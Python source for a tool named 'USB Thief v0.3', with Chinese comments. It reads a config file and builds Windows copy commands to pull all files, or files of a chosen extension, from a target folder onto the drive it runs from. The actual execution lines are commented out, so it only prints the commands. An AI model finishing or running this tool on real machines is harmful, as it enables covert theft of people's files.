# USB Thief v0.3
#.ini 配置文件：
# [0]目标文件夹地址 
# [1]单次复制文件的最大值(GB) 1GB = 1048576kb
# [2]if 执行的操作
# [3](2,3)操作下的所需的文件后缀


import os
from Get_FilesAndDoc import Get_FilesPath,Get_AllFiles
from Check_ini import CheckPath


CheckPath()

LocalPath = os.getcwd()
OpenPath = LocalPath + r"\USBthief.ini"
USBthief = open(OpenPath,"r")
# 获取本脚本的运行路径并指定为配置文件以及复制文件的保存路径

Settings = []
while True:
    ini_read = USBthief.readline()
    if ini_read == "END":
        break
    else:
        Settings.append(ini_read.replace("\n",""))# replace 方法替换转义字符为空字符串
# 配置文件读取并处理
CopyPath = Settings[0]
Mix_GB = int(Settings[1]) * 1048576
Copy_Choice = int(Settings[2])#int(input("请输入目标指令："))
TargetEnd = Settings[3]


if Copy_Choice == 1:

    FilesPath = Get_FilesPath(CopyPath,Mix_GB)

    for SingleFile in FilesPath:
        Command = 'copy ' + SingleFile + ' ' + LocalPath
        print(Command)
        # os.system(Command)
   
    USBthief.close()
   
elif Copy_Choice == 2:

    #TargetEnd = "json"#input("请输入文件的后缀名：")
    FilesPath = Get_FilesPath(CopyPath,Mix_GB)
    
    for SingleFile in FilesPath:

        FilesPath_listed = list(SingleFile)
        SingleLet = FilesPath_listed.index(".")
        FilesNameLength = SingleLet + 1
        FilesEnd = ""

        for x in range(0,len(FilesPath_listed) - FilesNameLength):
            FilesEnd = FilesEnd + FilesPath_listed[FilesNameLength]
            FilesNameLength = FilesNameLength + 1
        # 提取读取文件的后缀名并用FilesEnd接受
        if FilesEnd == TargetEnd:
            Command = 'copy ' + SingleFile + ' ' + LocalPath
            print(Command)
            # os.system(Command)
        # 通过判断后缀格式筛选索要复制的文件
    USBthief.close()

elif Copy_Choice == 3:

    #TargetEnd = "txt"#input("请输入文件的后缀名：")
    FilesPath = Get_AllFiles(CopyPath,Mix_GB)
    
    for SingleFile in FilesPath:

        FilesPath_listed = list(SingleFile)
        SingleLet = FilesPath_listed.index(".")
        FilesNameLength = SingleLet + 1
        FilesEnd = ""

        for x in range(0,len(FilesPath_listed) - FilesNameLength):
            FilesEnd = FilesEnd + FilesPath_listed[FilesNameLength]
            FilesNameLength = FilesNameLength + 1
        # 提取读取文件的后缀名并用FilesEnd接受
        if FilesEnd == TargetEnd:
            Command = 'copy ' + CopyPath + '\\' + SingleFile + ' ' + LocalPath
            print(Command)
            # os.system(Command)
        # 通过判断后缀格式筛选索要复制的文件
    USBthief.close()

else:
    USBthief.close()
# cmd 的 copy 命令 copy 文件路径 目标路径